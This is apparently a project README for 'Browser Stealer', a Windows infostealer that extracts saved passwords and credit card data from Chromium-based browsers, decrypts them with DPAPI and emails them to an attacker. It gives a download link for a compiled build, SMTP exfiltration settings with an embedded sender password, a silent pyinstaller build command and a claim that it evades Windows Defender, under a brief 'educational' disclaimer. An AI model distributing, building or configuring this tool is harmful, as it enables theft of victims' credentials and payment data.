# Browser Stealer
Finds Internet browsers and applications that use those browsers. It detects files that hold personal information such as username and password, and credit card information. It decrypts these files using DPAPI. It transmits this information to the attacker via email.

**1) The algorithm used by the program for saved passwords is shown in the graphic below.**
![key1](https://user-images.githubusercontent.com/71177413/166139625-fd15d6ea-6355-4a80-ae83-15b6437b54e5.JPG)

**2) The algorithm used by the program for saved credit cards is shown in the graphic below.**
![key2](https://user-images.githubusercontent.com/71177413/166139633-a23d31a5-d098-440d-ba6b-ae36995777b7.JPG)


Supported Browsers
---
This python program gets all the saved passwords and credit cards from chromium based browsers supports chromium 80 and above!
<dl>
  <dt> Supported some browsers
  <dd>
  <dd> ✔ Chrome
  <dd> ✔ Brave
  <dd> ✔ Edge (Chromium)
  <dd> ✔ Opera
  <dd> ✔ Yandex
  <dd> ✔ Other browsers
</dl>


The Compiled Version of the Program Can be Downloaded from the Links Below.
---
<dl>
  <dt> Browser Stealer
  <dd>
  <dd> Browser_Stealer.rar --> zip password: "BrOWserSteaLEr2022"
  <dd> Link = https://drive.google.com/file/d/1Q2XkhU64vHzKfyxmuPh-c9U3JdoqFeyS/view?usp=sharing
</dl>

Requirements
---
Required libraries:  pywin32, pycryptodome, pyinstaller

```
pip install pywin32
pip install pycryptodome
pip install pyinstaller
```

"pyinstaller" will be used to make the code one piece executable


Settings
---
![A](https://user-images.githubusercontent.com/71177413/166140037-c624e1f9-eaf7-48dc-953b-c28ad4e80d15.JPG)

```
    SMTP_SERVER      = "smtp-mail.outlook.com"           # SMTP server for e-mail to be sent
    SMTP_PORT        = "587"                             # SMTP port for e-mail to be sent
    SENDER_ADDRESS   = "ajehdfgruewsf@outlook.com"       # Sender e-mail address
    SENDER_PASS      = "uy8mNbvx4c9agehe5uwk6wxv"        # Sender e-mail password
    RECEIVER_ADDRESS = "python.test.email@outlook.com"   # Receiver e-mail address
```

<dl>
  <dt>
  <dt> Some settings can be changed with initial parameters if desired.
  <dd>
  <dd> -smail:***          ==> sets sender e-mail address   ["SENDER_ADDRESS"]
  <dd> -spass:***          ==> sets sender e-mail password  ["SENDER_PASS"]
  <dd> -rmail:***          ==> sets receiver e-mail address ["RECEIVER_ADDRESS"]
</dl> 

<dl>
  <dt>
  <dt> Example:
  <dd>
  <dd> Browser_Stealer.exe  -smail:gungor@outlook.com -spass:123jKl789 -rmail:receiver@mail.com
  <dd>
</dl>

![5](https://user-images.githubusercontent.com/71177413/166140529-f69a38f2-59ef-4e8c-a577-2b548dc82245.JPG)


Compilation
---
[Language : Python 3.8.5]
```
pyinstaller --onefile --noconsole --icon=Browser_Stealer.ico Browser_Stealer.py
```

Some Screenshot of the Working of the Program
---

**Screenshot [1] (Depending on your e-mail settings, e-mails may fall into junk email.)**
![2](https://user-images.githubusercontent.com/71177413/166143957-9f4f56f2-78a6-478b-be33-cc359767bc75.JPG)


**Screenshot [2] (When the program runs, it sends the information to the e-mail address in its settings.)**
![3](https://user-images.githubusercontent.com/71177413/166144090-8fb3048f-9bca-47f8-beaa-46ecad1669cd.JPG)


**Screenshot [3] (The e-mail address can be changed by sending the parameters to the program at the beginning.)**
![4](https://user-images.githubusercontent.com/71177413/166144022-c4fb9fc9-fe39-43e1-896e-af37611de673.JPG)


Windows Defender
---
As of 01/05/2022, it is not caught by the Windows Defender program. Over time this will change.

Legal Warning
---
Run your tests on virtual machines. The responsibility for illegal use belongs to the user. Shared for educational purposes.
